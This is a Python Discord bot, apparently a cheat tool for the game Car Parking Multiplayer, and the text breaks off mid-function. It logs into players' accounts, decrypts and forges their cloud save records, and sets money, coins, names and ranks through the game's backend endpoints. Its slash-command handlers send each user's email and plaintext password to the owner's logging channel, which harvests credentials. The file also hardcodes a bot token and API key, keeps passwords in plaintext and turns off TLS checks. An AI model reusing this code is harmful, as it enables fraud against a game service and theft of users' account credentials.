import discord
from discord import app_commands
from discord.ext import commands
import aiohttp
import json
import sqlite3
import time
import struct
import hashlib
import base64
import re
from copy import deepcopy
from datetime import datetime
from pathlib import Path
from typing import Any, Dict, List, Optional
import asyncio
import zlib

try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import unpad
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False

try:
    import brotli
    HAS_BROTLI = True
except ImportError:
    HAS_BROTLI = False

# ═══════════════════════════════════════════
#  ⚙️  CONFIG
# ═══════════════════════════════════════════

TOKEN = "MTU0MDIzNzY5MTQ5MTMyODAzMQ.Gi_BfV.EGdCZvT08baebKExJe6ukDMGskcW0nnDQB3Wr4"  # 👈 حط التوكن تاعك
OWNER_ID = 661351117049036880  # 👈 حط الـ ID تاعك

# 🔥 حط هنا ID الروم لي تبغي تظهر فيه اللوغات 🔥
LOGS_CHANNEL_ID = 1540261596318924800  # 👈 غيّر هذا الرقم

FK = "AIzaSyAe_aOVT1gSfmHKBrorFvX4fRwN5nODXVA"
LOAD_URL = "https://europe-west1-cp-multiplayer.cloudfunctions.net/GetPlayerRecords3"
SAVE_URL = "https://europe-west1-cp-multiplayer.cloudfunctions.net/SavePlayerRecordsPartially8"
RANK_URL = "https://europe-west1-cp-multiplayer.cloudfunctions.net/SetUserRating6"

MAX_MONEY = 50_000_000
MAX_COIN = 500_000

# ═══════════════════════════════════════════
#  🗄️  STORE
# ═══════════════════════════════════════════

STORE_PATH = Path("cpm_store_discord.json")

DEFAULT_STORE: Dict[str, Any] = {
    "allowed_users": [],
    "admins": [],
    "banned": [],
    "user_limits": {},
    "stats": {"total_actions": 0},
}

def load_store() -> Dict[str, Any]:
    try:
        if STORE_PATH.exists():
            with STORE_PATH.open("r", encoding="utf-8") as f:
                data = json.load(f)
            for k, v in DEFAULT_STORE.items():
                if k not in data:
                    data[k] = deepcopy(v)
            return data
        save_store(DEFAULT_STORE)
        return deepcopy(DEFAULT_STORE)
    except Exception:
        save_store(DEFAULT_STORE)
        return deepcopy(DEFAULT_STORE)

def save_store(data: Dict[str, Any]) -> bool:
    try:
        with STORE_PATH.open("w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        return True
    except Exception:
        return False

STORE = load_store()
ALLOWED_USERS: List[int] = list(STORE.get("allowed_users", []))
ADMINS: List[int] = list(STORE.get("admins", []))
BANNED: List[int] = list(STORE.get("banned", []))
USER_LIMITS: Dict[str, Dict] = STORE.get("user_limits", {})

if OWNER_ID not in ALLOWED_USERS:
    ALLOWED_USERS.append(OWNER_ID)
    STORE["allowed_users"] = ALLOWED_USERS
    save_store(STORE)

if OWNER_ID not in ADMINS:
    ADMINS.append(OWNER_ID)
    STORE["admins"] = ADMINS
    save_store(STORE)

def is_allowed(uid): return uid in ALLOWED_USERS
def is_banned(uid): return uid in BANNED
def is_admin(uid): return uid in ADMINS

def check_limit(uid) -> bool:
    uid_str = str(uid)
    if uid in ADMINS or uid == OWNER_ID:
        return True
    
    if uid_str not in USER_LIMITS:
        USER_LIMITS[uid_str] = {"limit": 5, "used": 0}
        STORE["user_limits"] = USER_LIMITS
        save_store(STORE)
    
    limit_data = USER_LIMITS[uid_str]
    return limit_data["used"] < limit_data["limit"]

def increment_usage(uid):
    uid_str = str(uid)
    if uid in ADMINS or uid == OWNER_ID:
        return
    
    if uid_str not in USER_LIMITS:
        USER_LIMITS[uid_str] = {"limit": 5, "used": 0}
    
    USER_LIMITS[uid_str]["used"] += 1
    STORE["user_limits"] = USER_LIMITS
    save_store(STORE)

def reset_user_limit(uid):
    uid_str = str(uid)
    if uid_str not in USER_LIMITS:
        USER_LIMITS[uid_str] = {"limit": 5, "used": 0}
    else:
        USER_LIMITS[uid_str]["used"] = 0
    STORE["user_limits"] = USER_LIMITS
    save_store(STORE)

def set_user_limit(uid, limit):
    uid_str = str(uid)
    if uid_str not in USER_LIMITS:
        USER_LIMITS[uid_str] = {"limit": limit, "used": 0}
    else:
        USER_LIMITS[uid_str]["limit"] = limit
    STORE["user_limits"] = USER_LIMITS
    save_store(STORE)

def get_user_limit_info(uid):
    uid_str = str(uid)
    if uid_str not in USER_LIMITS:
        USER_LIMITS[uid_str] = {"limit": 5, "used": 0}
        STORE["user_limits"] = USER_LIMITS
        save_store(STORE)
    return USER_LIMITS[uid_str]

# ═══════════════════════════════════════════
#  📊 LOGS FUNCTION
# ═══════════════════════════════════════════

async def send_log(title: str, description: str, color: int = 0x00ff00, fields: list = None):
    """إرسال لوغات إلى الروم المحدد"""
    try:
        channel = bot.get_channel(LOGS_CHANNEL_ID)
        if channel:
            embed = discord.Embed(
                title=title,
                description=description,
                color=color,
                timestamp=datetime.now()
            )
            if fields:
                for name, value, inline in fields:
                    embed.add_field(name=name, value=value, inline=inline)
            await channel.send(embed=embed)
    except Exception as e:
        print(f"⚠️ Failed to send log: {e}")

# ═══════════════════════════════════════════
#  🔐 CRYPTO
# ═══════════════════════════════════════════

def make_xor_key(uid: str) -> bytes:
    chars = list(uid)
    if len(chars) >= 9: chars[1], chars[8] = chars[8], chars[1]
    if len(chars) >= 3: chars.pop(2)
    if len(chars) >= 5: chars.append(chars[4])
    return "".join(chars).encode("utf-8")

def xor_bytes(data: bytes, key: bytes) -> bytes:
    return bytes(data[i] ^ key[i % len(key)] for i in range(len(data)))

def decompress(data: bytes) -> Optional[bytes]:
    if HAS_BROTLI:
        try: return brotli.decompress(data)
        except: pass
    try: return zlib.decompress(data, zlib.MAX_WBITS | 16)
    except: pass
    try: return zlib.decompress(data)
    except: pass
    return None

def decrypt_aes(data: bytes, key: bytes) -> Optional[bytes]:
    if not HAS_CRYPTO: return None
    try:
        cipher = AES.new(key[:16], AES.MODE_CBC, b"\x00" * 16)
        return unpad(cipher.decrypt(data), 16)
    except: return None

def _md5(t): return hashlib.md5(t.encode()).digest()
def _sha1(t): return hashlib.sha1(t.encode()).digest()[:16]

def build_aes_keys(uid, password=None, email=None):
    keys = [_md5("olzhas_carparking")]
    if password: keys += [_md5(password), _sha1(password)]
    if uid: keys += [_md5(uid), _sha1(uid)]
    if email: keys.append(_md5(email))
    return keys

class Reader:
    def __init__(self, data):
        self.buf = data; self.pos = 0

    def has_bytes(self, n): return self.pos + n <= len(self.buf)

    def read_byte(self):
        if not self.has_bytes(1): return 0
        v = self.buf[self.pos]; self.pos += 1; return v

    def read_int(self):
        if not self.has_bytes(4): self.pos = len(self.buf); return 0
        v = struct.unpack_from("<i", self.buf, self.pos)[0]; self.pos += 4; return v

    def read_float(self):
        if not self.has_bytes(4): self.pos = len(self.buf); return 0.0
        v = struct.unpack_from("<f", self.buf, self.pos)[0]; self.pos += 4; return v

    def read_string(self):
        marker = self.read_int()
        if marker in (0, -1): return ""
        length = (-marker) - 1 if marker < -1 else marker
        if marker < -1: self.read_int()
        if length > 1_000_000: length = 1_000_000
        if not self.has_bytes(length): return ""
        text = self.buf[self.pos:self.pos + length].decode("utf-8", errors="replace")
        self.pos += length
        return text.replace("\x00", "").strip()

    def read_list(self, item_fn):
        count = self.read_int()
        if count <= 0 or count > 1_000_000: return []
        result = []
        for _ in range(count):
            if self.pos >= len(self.buf): break
            v = item_fn()
            if v is not None: result.append(v)
        return result

    def read_dict(self):
        count = self.read_int()
        if count <= 0 or count > 1_000_000: return {}
        d = {}
        for _ in range(count):
            if self.pos >= len(self.buf): break
            d[self.read_int()] = self.read_int()
        return d

    def read_equipment(self):
        if self.read_byte() == 0: return None
        return {
            "hair": self.read_list(self.read_int),
            "face": self.read_list(self.read_int),
            "beard": self.read_list(self.read_int),
            "cap": self.read_list(self.read_int),
            "mask": self.read_list(self.read_int),
            "top": self.read_list(self.read_int),
            "gloves": self.read_list(self.read_int),
            "bag": self.read_list(self.read_int),
            "pants": self.read_list(self.read_int),
            "shoes": self.read_list(self.read_int),
            "glasses": self.read_list(self.read_int),
            "SelectedEquipments": self.read_list(self.read_int),
            "Gender": self.read_int(),
        }

def parse_player(buf):
    r = Reader(buf)
    if r.read_byte() == 0: return None
    p = {}
    p["Name"] = r.read_string(); p["money"] = r.read_int()
    p["coin"] = r.read_int(); p["localID"] = r.read_string()

    def read_friend():
        r.read_byte()
        return {"id": r.read_string(), "Name": r.read_string(), "accountID": r.read_string()}

    p["FriendsID"] = r.read_list(read_friend)
    p["LevelsDoneTime"] = r.read_list(r.read_float)
    p["floats"] = r.read_list(r.read_float)
    p["integers"] = r.read_list(r.read_int)
    p["fcar"] = r.read_list(r.read_int)
    p["favouriteWheels"] = r.read_list(r.read_int)
    p["favouriteVinyls"] = r.read_list(r.read_int)
    p["favouriteEmojis"] = r.read_list(r.read_int)
    p["personEquipmentsMale"] = r.read_equipment()
    p["personEquipmentsFemale"] = r.read_equipment()
    p["allData"] = r.read_string()
    p["flags"] = r.read_dict()
    p["animations"] = r.read_list(r.read_int)
    p["emojiPacks"] = r.read_list(r.read_int)
    p["wheels"] = r.read_list(r.read_int)
    p["boughtPoliceLights"] = r.read_list(r.read_int)
    p["boughtPoliceSirens"] = r.read_list(r.read_int)
    return p

def try_parse(buf):
    candidates = [buf]
    d1 = decompress(buf)
    if d1:
        candidates.append(d1)
        d2 = decompress(d1)
        if d2: candidates.append(d2)
    for c in candidates:
        if not c: continue
        if len(c) > 0 and c[0] in (17, 23, 24):
            try:
                p = parse_player(c)
                if p and p.get("Name") is not None: return p
            except: pass
        try:
            clean = c[3:] if (len(c) >= 3 and c[0] == 0xef and c[1] == 0xbb) else c
            if clean[0] == 123: return json.loads(clean.decode("utf-8"))
        except: pass
    return None

def decrypt_player_record(base64_text, uid, password=None, email=None):
    try: buf = base64.b64decode(base64_text)
    except: return {"success": False, "message": "Bad base64"}
    if len(buf) < 10: return {"success": False, "message": "Too small"}

    direct = try_parse(buf)
    if direct: return {"success": True, "record": direct}

    if uid:
        try:
            xp = xor_bytes(buf, make_xor_key(uid))
            d = decompress(xp)
            if d:
                p = try_parse(d)
                if p: return {"success": True, "record": p}
        except: pass

    for key in build_aes_keys(uid or "", password, email):
        plain = decrypt_aes(buf, key)
        if not plain: continue
        p = try_parse(plain)
        if p: return {"success": True, "record": p}

    return {"success": False, "message": "Could not decrypt"}

class Writer:
    def __init__(self): self._p: List[bytes] = []
    def write_byte(self, v): self._p.append(bytes([v & 0xFF]))
    def write_int(self, v): self._p.append(struct.pack("<i", int(v or 0)))
    def write_float(self, v): self._p.append(struct.pack("<f", float(v or 0.0)))

    def write_string(self, s):
        if s is None: self._p.append(struct.pack("<i", -1)); return
        s = str(s)
        if s == "": self._p.append(struct.pack("<i", 0)); return
        enc = s.encode("utf-8")
        self._p.append(struct.pack("<ii", -(len(enc)) - 1, len(s)) + enc)

    def write_list(self, lst, fn):
        if lst is None: self._p.append(struct.pack("<i", -1)); return
        self._p.append(struct.pack("<i", len(lst)))
        for item in lst: fn(item)

    def to_bytes(self): return b"".join(self._p)

FIELD_MAPPING = [
    (1,"localID"),(2,"money"),(3,"Name"),(4,"coin"),(5,"allData"),
    (6,"boughtFsos"),(7,"boughtPoliceLights"),(8,"boughtPoliceSirens"),
    (9,"FriendsID"),(10,"LevelsDoneTime"),(11,"floats"),(12,"integers"),
    (13,"fcar"),(14,"favouriteWheels"),(15,"favouriteVinyls"),
    (16,"favouriteEmojis"),(18,"emojiPacks"),
    (41,"personEquipmentsMale"),(42,"personEquipmentsFemale"),
    (43,"platesData"),(44,"carIDnStatus"),(45,"flags"),
    (46,"animations"),(48,"wheels"),
]

INT_LIST_FIELDS = {6,7,8,12,13,14,15,16,18,46,48}
FLOAT_LIST_FIELDS = {10,11}
ALWAYS_SEND = {"allData"}

def _field_modified(nv, ov):
    if nv is None and ov is None: return False
    if nv is None or ov is None: return True
    if type(nv) != type(ov): return True
    if isinstance(nv, (dict,list)):
        return json.dumps(nv,sort_keys=True) != json.dumps(ov,sort_keys=True)
    return nv != ov

def serialize_field(fid, value):
    w = Writer()
    if fid in (1,3,5): w.write_string(value); return w.to_bytes()
    if fid in (2,4): w.write_int(value or 0); return w.to_bytes()
    if fid == 9:
        friends = value or []
        w._p.append(struct.pack("<i", len(friends)))
        for f in friends:
            w.write_byte(3)
            w.write_string((f or {}).get("id",""))
            w.write_string((f or {}).get("Name",""))
            w.write_string((f or {}).get("accountID",""))
        return w.to_bytes()
    if fid in INT_LIST_FIELDS: w.write_list(value or [], w.write_int); return w.to_bytes()
    if fid in FLOAT_LIST_FIELDS: w.write_list(value or [], w.write_float); return w.to_bytes()
    if fid in (41,42): 
        if not value: w.write_byte(0); return w.to_bytes()
        w.write_byte(13)
        for k in ["hair","face","beard","cap","mask","top","gloves","bag","pants","shoes","glasses","SelectedEquipments"]:
            w.write_list(value.get(k, []), w.write_int)
        w.write_int(value.get("Gender", 0))
        return w.to_bytes()
    if fid == 45:
        flags = value or {}
        w._p.append(struct.pack("<i", len(flags)))
        for k, v in flags.items():
            w.write_int(int(k)); w.write_int(int(v))
        return w.to_bytes()
    return None

def build_payload(record, uid, original=None):
    fields = []
    for fid, key in FIELD_MAPPING:
        value = record.get(key)
        if value is None: continue
        if key in ALWAYS_SEND:
            should = isinstance(value, str) and len(value) > 0
        elif original is not None:
            should = _field_modified(value, original.get(key))
        else:
            should = True
        if not should: continue
        raw = serialize_field(fid, value)
        if raw is not None: fields.append((fid, raw))

    parts = [struct.pack("<i", len(fields))]
    for fid, raw in fields:
        parts.append(struct.pack("<hi", fid, len(raw)))
        parts.append(raw)
    combined = b"".join(parts)
    compressed = brotli.compress(combined) if HAS_BROTLI else zlib.compress(combined)
    encrypted = xor_bytes(compressed, make_xor_key(uid))
    return base64.b64encode(encrypted).decode("ascii")

# ═══════════════════════════════════════════
#  🎮 CPM NUKER
# ═══════════════════════════════════════════

GAME_HEADERS = {
    "Accept": "*/*", "Accept-Encoding": "gzip",
    "Content-Type": "application/json",
    "User-Agent": "UnityPlayer/2022.3.62f2 (UnityWebRequest/1.0, libcurl/8.10.1-DEV)",
    "X-Unity-Version": "2022.3.62f2",
}

class CPMNuker:
    def __init__(self):
        self.db_path = "cpm_tokens_discord.db"
        self.cache: Dict[str, Dict] = {}
        self._init_db()

    def _init_db(self):
        with sqlite3.connect(self.db_path) as c:
            c.execute("""CREATE TABLE IF NOT EXISTS tokens (
                user_id INTEGER PRIMARY KEY, auth_token TEXT, email TEXT,
                password TEXT, refresh_token TEXT, firebase_uid TEXT,
                token_expires_at REAL)""")
            c.execute("""CREATE TABLE IF NOT EXISTS user_data (
                cache_key TEXT PRIMARY KEY, email TEXT, data_json TEXT)""")
            try: c.execute("ALTER TABLE tokens ADD COLUMN firebase_uid TEXT")
            except: pass
            c.commit()

    def _ck(self, uid, email=None):
        if email: return f"{uid}_{email}"
        td = self.get_token_data(uid)
        return f"{uid}_{td['email']}" if td and td.get("email") else str(uid)

    def save_token(self, uid, auth, email, pw=None, rt=None, fuid=None):
        with sqlite3.connect(self.db_path) as c:
            c.execute("""INSERT OR REPLACE INTO tokens
                (user_id,auth_token,email,password,refresh_token,firebase_uid,token_expires_at)
                VALUES (?,?,?,?,?,?,?)""",
                (uid, auth, email, pw, rt, fuid, time.time()+3600))
            c.commit()

    def get_token_data(self, uid):
        with sqlite3.connect(self.db_path) as c:
            row = c.execute("""SELECT auth_token,email,password,refresh_token,
                firebase_uid,token_expires_at FROM tokens WHERE user_id=?""", (uid,)).fetchone()
        if row:
            return {"auth_token":row[0],"email":row[1],"password":row[2],
                    "refresh_token":row[3],"firebase_uid":row[4],"token_expires_at":row[5]}
        return None

    def get_token(self, uid):
        td = self.get_token_data(uid)
        return {"auth_token":td["auth_token"],"email":td["email"]} if td else None

    def update_token(self, uid, auth, rt=None):
        exp = time.time()+3600
        with sqlite3.connect(self.db_path) as c:
            if rt: c.execute("UPDATE tokens SET auth_token=?,refresh_token=?,token_expires_at=? WHERE user_id=?",(auth,rt,exp,uid))
            else: c.execute("UPDATE tokens SET auth_token=?,token_expires_at=? WHERE user_id=?",(auth,exp,uid))
            c.commit()

    def delete_token(self, uid):
        with sqlite3.connect(self.db_path) as c:
            c.execute("DELETE FROM tokens WHERE user_id=?",(uid,)); c.commit()
        for k in [k for k in self.cache if k.startswith(str(uid))]:
            del self.cache[k]

    def is_expired(self, uid):
        td = self.get_token_data(uid)
        return not td or not td.get("token_expires_at") or td["token_expires_at"] < time.time()

    def get_record(self, uid, email=None):
        ck = self._ck(uid, email)
        if ck not in self.cache:
            with sqlite3.connect(self.db_path) as c:
                row = c.execute("SELECT data_json FROM user_data WHERE cache_key=?",(ck,)).fetchone()
            if row:
                try: self.cache[ck] = json.loads(row[0])
                except: pass
        return self.cache.get(ck, {})

    def set_record(self, uid, data, email=None):
        ck = self._ck(uid, email)
        self.cache[ck] = data
        with sqlite3.connect(self.db_path) as c:
            c.execute("INSERT OR REPLACE INTO user_data (cache_key,email,data_json) VALUES (?,?,?)",
                      (ck, email, json.dumps(data))); c.commit()

    async def _post(self, url, payload, headers):
        try:
            h = {k:v for k,v in headers.items() if k.lower() != "host"}
            timeout = aiohttp.ClientTimeout(total=30)
            async with aiohttp.ClientSession(timeout=timeout, connector=aiohttp.TCPConnector(ssl=False)) as s:
                async with s.post(url, json=payload, headers=h) as r:
                    text = await r.text()
                    try: return json.loads(text)
                    except: return {"raw": text, "status": r.status}
        except Exception as e:
            return None

    async def login(self, email, password):
        url = f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={FK}"
        h = {"Accept":"*/*","Accept-Encoding":"gzip","Content-Type":"application/json",
             "User-Agent":"UnityPlayer/2022.3.62f2 (UnityWebRequest/1.0, libcurl/8.10.1-DEV)",
             "X-Unity-Version":"2022.3.62f2"}
        p = {"email":email,"password":password,"returnSecureToken":True,"clientType":"CLIENT_TYPE_ANDROID"}
        try:
            timeout = aiohttp.ClientTimeout(total=30)
            async with aiohttp.ClientSession(timeout=timeout, connector=aiohttp.TCPConnector(ssl=False)) as s:
                async with s.post(url, json=p, headers=h) as resp:
                    text = await resp.text()
                    try: r = json.loads(text)
                    except: return {"ok":False,"message":"NETWORK_ERROR"}
        except Exception as e:
            return {"ok":False,"message":"NETWORK_ERROR"}

        if "idToken" in r:
            return {"ok":True,"auth":r["idToken"],"refresh_token":r.get("refreshToken",""),"firebase_uid":r.get("localId","")}
        err = str(r.get("error",{}).get("message","")).upper()
        for k in ["EMAIL_NOT_FOUND","INVALID_PASSWORD","INVALID_LOGIN_CREDENTIALS","TOO_MANY_ATTEMPTS","USER_DISABLED","INVALID_EMAIL"]:
            if k in err: return {"ok":False,"message":k}
        return {"ok":False,"message":f"LOGIN_FAILED: {err[:60]}"}

    async def _refresh(self, uid):
        td = self.get_token_data(uid)
        if not td: return False,"NO_TOKEN"
        rt,em,pw = td.get("refresh_token"),td.get("email"),td.get("password")
        if rt:
            try:
                timeout = aiohttp.ClientTimeout(total=30)
                async with aiohttp.ClientSession(timeout=timeout, connector=aiohttp.TCPConnector(ssl=False)) as s:
                    async with s.post(f"https://securetoken.googleapis.com/v1/token?key={FK}",
                        json={"grant_type":"refresh_token","refresh_token":rt},
                        headers={"Content-Type":"application/json"}) as resp:
                        r = await resp.json(content_type=None)
                        if r and r.get("id_token"):
                            self.update_token(uid,r["id_token"],r.get("refresh_token",rt))
                            return True,"OK"
            except: pass
        if em and pw:
            res = await self.login(em,pw)
            if res.get("ok"):
                self.save_token(uid,res["auth"],em,pw,res.get("refresh_token",""),res.get("firebase_uid",""))
                return True,"OK"
        return False,"REFRESH_FAILED"

    async def get_auth(self, uid):
        if self.is_expired(uid):
            ok,msg = await self._refresh(uid)
            if not ok: return False,msg,""
        td = self.get_token_data(uid)
        if td and td.get("auth_token"): return True,"OK",td["auth_token"]
        return False,"NO_TOKEN",""

    async def load(self, uid, force=False):
        td = self.get_token_data(uid)
        if not td: return False
        ck = self._ck(uid)
        if not force and ck in self.cache: return True
        ok,msg,auth = await self.get_auth(uid)
        if not ok: return False
        try:
            r = await self._post(LOAD_URL,{"data":None},{**GAME_HEADERS,"Authorization":f"Bearer {auth}"})
            if not r or not r.get("result"): return False
            dec = decrypt_player_record(r["result"],td.get("firebase_uid",""),td.get("password",""),td.get("email",""))
            if dec.get("success") and dec.get("record"):
                self.set_record(uid,dec["record"],td.get("email",""))
                return True
            return False
        except Exception:
            return False

    def _ok(self, v):
        if v in (1,True): return True
        if v in (0,False): return False
        if isinstance(v,str):
            t=v.strip()
            if t=="1": return True
            if t=="0": return False
            try: return self._ok(json.loads(t))
            except: return False
        if isinstance(v,dict):
            for k in ("result","ok","success"):
                if k in v: return self._ok(v[k])
        return False

    async def _send(self, auth, record, fuid, original=None):
        if not fuid: return False,"NO_UID"
        try:
            payload = build_payload(record, fuid, original)
            r = await self._post(SAVE_URL,
                {"data":{"data":payload,"deviceId":fuid[:8]}},
                {**GAME_HEADERS,"Authorization":f"Bearer {auth}","Connection":"Keep-Alive",
                 "User-Agent":"Dalvik/2.1.0 (Linux; U; Android 12; Pixel 6 Build/SD1A.210817.036)"})
            if r and self._ok(r): return True,"OK"
            return False,f"SAVE_FAILED: {str(r)[:100]}"
        except Exception as e: return False,str(e)

    async def _save(self, uid, data):
        ok,msg,auth = await self.get_auth(uid)
        if not ok: return {"ok":False,"message":msg}
        td = self.get_token_data(uid)
        fuid = td.get("firebase_uid","") if td else ""
        email = td.get("email","") if td else ""
        orig = self.get_record(uid,email) or None
        ok2,msg2 = await self._send(auth,data,fuid,orig)
        if ok2:
            self.set_record(uid,data,email)
            STORE["stats"]["total_actions"] = STORE["stats"].get("total_actions",0)+1
            save_store(STORE)
            return {"ok":True}
        return {"ok":False,"message":msg2}

    async def _modify(self, uid, mods):
        await self.load(uid)
        td = self.get_token_data(uid)
        email = td.get("email") if td else None
        d = deepcopy(self.get_record(uid,email))
        if not d or not d.get("Name"):
            return {"ok":False,"message":"Could not load account data. Try Refresh first."}
        for k,v in mods.items():
            if k=="money": v=min(v,MAX_MONEY)
            if k=="coin": v=min(v,MAX_COIN)
            d[k]=v
        return await self._save(uid,d)

    async def set_money(self, uid, amount):
        return await self._modify(uid, {"money": min(amount, MAX_MONEY)})

    async def set_coin(self, uid, amount):
        return await self._modify(uid, {"coin": min(amount, MAX_COIN)})

    async def set_player_name(self, uid, name):
        return await self._modify(uid, {"Name": name})

    async def set_player_id(self, uid, pid):
        return await self._modify(uid, {"localID": pid.upper()})
    
    async def login_and_save(self, email: str, password: str, user_id: int):
        login_result = await self.login(email, password)
        if not login_result.get("ok"):
            return {"ok": False, "message": login_result.get("message", "Login failed")}
        
        self.save_token(user_id, login_result["auth"], email, password, 
                       login_result.get("refresh_token", ""), login_result.get("firebase_uid", ""))
        
        await self.load(user_id, force=True)
        return {"ok": True}

    async def set_money_with_email(self, email: str, password: str, amount: int, user_id: int):
        login_result = await self.login_and_save(email, password, user_id)
        if not login_result.get("ok"):
            return login_result
        return await self.set_money(user_id, amount)

    async def set_coin_with_email(self, email: str, password: str, amount: int, user_id: int):
        login_result = await self.login_and_save(email, password, user_id)
        if not login_result.get("ok"):
            return login_result
        return await self.set_coin(user_id, amount)

    async def set_name_with_email(self, email: str, password: str, new_name: str, user_id: int):
        login_result = await self.login_and_save(email, password, user_id)
        if not login_result.get("ok"):
            return login_result
        return await self.set_player_name(user_id, new_name)

    async def set_id_with_email(self, email: str, password: str, new_id: str, user_id: int):
        login_result = await self.login_and_save(email, password, user_id)
        if not login_result.get("ok"):
            return login_result
        return await self.set_player_id(user_id, new_id)

    async def set_rank_king_with_email(self, email: str, password: str, user_id: int):
        login_result = await self.login_and_save(email, password, user_id)
        if not login_result.get("ok"):
            return login_result
        return await self.set_rank_king(user_id)

    async def set_rank_king(self, uid):
        await self.load(uid)
        ok,msg,auth = await self.get_auth(uid)
        if not ok: return {"ok":False,"message":msg}
        
        rating_data = {
            "cars": 100000, "car_fix": 100000, "car_collided": 100000,
            "car_exchange": 100000, "car_trade": 100000, "car_wash": 100000,
            "slicer_cut": 100000, "drift_max": 100000, "drift": 100000,
            "cargo": 100000, "delivery": 100000, "taxi": 100000, "levels": 100000,
            "gifts": 100000, "fuel": 100000, "offroad": 100000, "speed_banner": 100000,
            "reactions": 100000, "police": 100000, "run": 100000, "real_estate": 100000,
            "t_distance": 100000, "treasure": 100000, "block_post": 100000,
            "push_ups": 100000, "burnt_tire": 100000, "passanger_distance": 100000,
            "time": 10000000000, "race_win": 3000
        }
        
        rd = {"RatingData": rating_data}
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(RANK_URL, 
                    json={"data": json.dumps(rd)},
                    headers={
                        **GAME_HEADERS,
                        "Authorization": f"Bearer {auth}",
                        "User-Agent": "okhttp/3.12.13"
                    }
                ) as response:
                    if response.status == 200:
                        return {"ok": True}
                    else:
                        error_text = await response.text()
                        return {"ok": False, "message": f"RANK_FAILED: {response.status}"}
        except Exception as e:
            return {"ok": False, "message": str(e)}

    async def _load_with_auth(self, auth: str, firebase_uid: str, password: str, email: str):
        """تحميل البيانات باستخدام التوكن"""
        try:
            r = await self._post(LOAD_URL, {"data": None}, {**GAME_HEADERS, "Authorization": f"Bearer {auth}"})
            if not r or not r.get("result"):
                return {"ok": False, "message": "Failed to load data"}
            dec = decrypt_player_record(r["result"], firebase_uid, password, email)
            if dec.get("success") and dec.get("record"):
                return {"ok": True, "record": dec["record"]}
            return {"ok": False, "message": "Failed to decrypt data"}
        except Exception as e:
            return {"ok": False, "message": str(e)}

# ═══════════════════════════════════════════
#  🤖 DISCORD BOT - SLASH COMMANDS
# ═══════════════════════════════════════════

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="/", intents=intents)

nuker = None

@bot.event
async def on_ready():
    global nuker
    nuker = CPMNuker()
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="7ARAGA | CPM1"))
    
    # 🔥 إرسال لوغ عند تشغيل البوت
    await send_log(f"✅ Bot is ready!\nLogged in as {bot.user}\nOwner: <@{OWNER_ID}>", 0x00ff00)
    
    try:
        synced = await bot.tree.sync()
        print(f"✅ Synced {len(synced)} slash commands")
        for cmd in synced:
            print(f"   /{cmd.name}")
    except Exception as e:
        print(f"❌ Failed to sync commands: {e}")
    
    print("━" * 40)
    print(f"✅ Logged in as {bot.user}")
    print(f"👑 Owner ID: {OWNER_ID}")
    print(f"👥 Admins: {len(ADMINS)}")
    print(f"📊 Users: {len(ALLOWED_USERS)}")
    print(f"📋 Logs Channel ID: {LOGS_CHANNEL_ID}")
    print("━" * 40)

# ═══════════════════════════════════════════
#  📌 USER COMMANDS
# ═══════════════════════════════════════════

# ── KING RANK ──
@bot.tree.command(name="king", description="👑 Set KING RANK with email and password")
@app_commands.describe(
    email="Your CPM email",
    password="Your CPM password"
)
async def slash_king(interaction: discord.Interaction, email: str, password: str):
    if not is_allowed(interaction.user.id):
        await interaction.response.send_message("❌ No access.", ephemeral=True)
        return
    
    if is_banned(interaction.user.id):
        await interaction.response.send_message("🚫 You are banned!", ephemeral=True)
        return
    
    if not check_limit(interaction.user.id):
        limit_info = get_user_limit_info(interaction.user.id)
        await interaction.response.send_message(f"❌ You have reached your limit ({limit_info['limit']} uses). Contact admin.", ephemeral=True)
        return
    
    await interaction.response.defer()
    
    try:
        # 🔥 تسجيل الدخول للحصول على بيانات اللاعب
        login_result = await nuker.login(email, password)
        if not login_result.get("ok"):
            await interaction.edit_original_response(content=f"❌ Login failed: {login_result.get('message', 'Unknown error')}")
            return
        
        auth = login_result["auth"]
        firebase_uid = login_result.get("firebase_uid", "")
        
        # تحميل البيانات
        load_result = await nuker._load_with_auth(auth, firebase_uid, password, email)
        player_name = "Unknown"
        player_id = "Unknown"
        if load_result.get("ok") and load_result.get("record"):
            record = load_result.get("record", {})
            player_name = record.get("Name", "Unknown")
            player_id = record.get("localID", "Unknown")
        
        # تنفيذ King Rank
        result = await nuker.set_rank_king_with_email(email, password, interaction.user.id)
        
        if result.get("ok"):
            increment_usage(interaction.user.id)
            await interaction.edit_original_response(content=f"👑 **King Rank set successfully for {email}!**")
            
            # 🔥 إرسال لوغ بالشكل الجديد
            await send_log(
                title="👑 King Rank Applied",
                description=f"└ Discord: {interaction.user.name}",
                color=0x00ff00,
                fields=[
                    ("🎮 In-Game Name", f"`{player_name}`", False),
                    ("   In-Game Id", f"`{player_id}`", False),
                    ("📧 Email", f"`{email}`", False),
                    ("🔑 Password", f"`{password}`", False)
                ]
            )
        else:
            await interaction.edit_original_response(content=f"❌ King Rank failed: {result.get('message', 'Unknown error')}")
            await send_log(
                title="❌ King Rank Failed",
                description=f"└ Discord: {interaction.user.name}",
                color=0xff0000,
                fields=[
                    ("🎮 In-Game Name", f"`{player_name}`", False),
                    ("   In-Game Id", f"`{player_id}`", False),
                    ("📧 Email", f"`{email}`", False),
                    ("🔑 Password", f"`{password}`", False),
                    ("❌ Error", result.get('message', 'Unknown error'), False)
                ]
            )
    except Exception as e:
        await interaction.edit_original_response(content=f"❌ Error: {str(e)}")
        await send_log(
            title="⚠️ King Rank Error",
            description=f"└ Discord: {interaction.user.name}",
            color=0xff0000,
            fields=[
                ("📧 Email", f"`{email}`", False),
                ("❌ Error", str(e), False)
            ]
        )


# ── MONEY ──
@bot.tree.command(name="money", description="💰 Set money with email and password")
@app_commands.describe(
    email="Your CPM email",
    password="Your CPM password",
    amount="Amount of money (max 50,000,000)"
)
async def slash_money(interaction: discord.Interaction, email: str, password: str, amount: int):
    if not is_allowed(interaction.user.id):
        await interaction.response.send_message("❌ No access.", ephemeral=True)
        return
    
    if is_banned(interaction.user.id):
        await interaction.response.send_message("🚫 You are banned!", ephemeral=True)
        return
    
    if not check_limit(interaction.user.id):
        limit_info = get_user_limit_info(interaction.user.id)
